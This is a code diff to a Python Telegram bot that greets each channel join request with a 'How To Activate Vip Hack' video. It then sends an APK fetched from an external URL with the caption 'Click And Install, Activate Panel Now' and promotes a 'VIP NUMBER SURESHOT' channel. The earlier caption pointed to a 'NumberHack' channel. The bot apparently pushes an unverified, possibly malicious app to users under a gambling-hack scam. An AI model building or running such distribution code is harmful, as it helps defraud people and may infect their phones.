@@ -16,7 +16,7 @@ APK_URL = os.environ.get("APK_URL")
 VIP_CHANNEL_URL = os.environ.get("VIP_CHANNEL_URL")
 BOT_USERNAME = os.environ.get("BOT_USERNAME")
 LEAVE_MSG_URL = os.environ.get("LEAVE_MSG_URL")
-WELCOME_VIDEO_URL = os.environ.get("WELCOME_VIDEO_URL") # GitHub video link yahan add karein
+WELCOME_VIDEO_URL = os.environ.get("WELCOME_VIDEO_URL") 
 
 USERS_FILE = "users.json"
 LEAVE_IMAGE_URL = "https://kommodo.ai/i/UTlTK3RUQvuCGsM1aCLS"
@@ -64,28 +64,30 @@ async def send_apk(user_id, context):
     if not APK_CACHE:
         return
 
-    # Sirf APK wala button rakha hai
     btn = InlineKeyboardMarkup([
         [InlineKeyboardButton("GET SECRET APK ✅", url=f"https://t.me/{BOT_USERNAME}?start=apk")]
     ])
 
     file = BytesIO(APK_CACHE)
-    file.name = "jai club premium.apk"
+    # File name wahi rahega jo URL se milega
+    original_filename = APK_URL.split("/")[-1] if APK_URL else "premium.apk"
+    file.name = original_filename
+
+    # Updated APK Caption
+    apk_caption = (
+        "💰Click And Install 💰\n\n"
+        "💯 Activate Panel Now 💯"
+    )
 
     await context.bot.send_document(
         chat_id=user_id,
         document=file,
-        filename="jai club premium.apk",
-        caption=(
-            "✅ 100% BEST APK IN WHOLE TELEGRAM 💥\n\n"
-            "( ONLY FOR PREMIUM USERS ⚡️ )\n\n"
-            "HOW TO USE - https://t.me/JaiclubNumberHack/5\n\n"
-            "FOR HELP @Rd_hereee"
-        ),
+        filename=original_filename,
+        caption=apk_caption,
         reply_markup=btn
     )
 
-# ================= NEW JOIN REQUEST HANDLER =================
+# ================= JOIN REQUEST HANDLER =================
 async def join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.chat_join_request.from_user
 
@@ -93,7 +95,7 @@ async def join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
         users = load_users()
         add_user(user, users)
 
-        # 1. Welcome Video with Updated Caption (VIP Link removed)
+        # Welcome Video
         welcome_text = (
             "💰How To Activate Vip Hack💰\n"
             "Pls Video Ko Pura Dekhna\n"
@@ -106,13 +108,12 @@ async def join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
             caption=welcome_text
         )
 
-        # 2. Automatically Send APK
+        # Send APK
         await send_apk(user.id, context)
         
-        # Messages ke beech gap
         await asyncio.sleep(1.5)
 
-        # 3. Third Message (Promotional Channel)
+        # Third Message
         promo_msg = (
             "VIP NUMBER SURESHOT CHANNEL JOIN FREEE 👇🏻👇🏻\n\n"
             "https://t.me/+7SIcw7FkDo5hMjI1\n"
@@ -145,7 +146,6 @@ async def track_leave(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ================= BROADCAST =================
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Only Admin should use this
     if not update.message.reply_to_message:
         await update.message.reply_text("Reply to message to broadcast")
         return
@@ -178,8 +178,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ================= MAIN EXECUTION =================
 def main():
     fetch_apk()
-    
-    # drop_pending_updates=True adds safety from conflict errors
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
     app.add_handler(ChatJoinRequestHandler(join_request))
